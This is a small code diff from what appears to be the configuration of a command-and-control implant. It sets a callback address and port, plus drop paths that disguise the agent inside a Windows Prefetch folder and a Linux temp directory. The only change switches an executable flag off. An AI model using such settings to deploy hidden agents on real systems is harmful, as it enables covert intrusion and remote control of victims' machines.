@@ -7,7 +7,7 @@ let c2_scheme* = protectString("http")
 let c2_address* = protectString("10.100.102.5")
 let c2_port* = 80
 # Agent
-let is_exe* = true
+let is_exe* = false
 let sleep_on_execution* = 0
 let agent_execution_path_windows* = protectString("C:\\ProgramData\\Prefetch\\na.exe")
 let agent_execution_path_linux* = protectString("/tmp/metadata/na.elf")
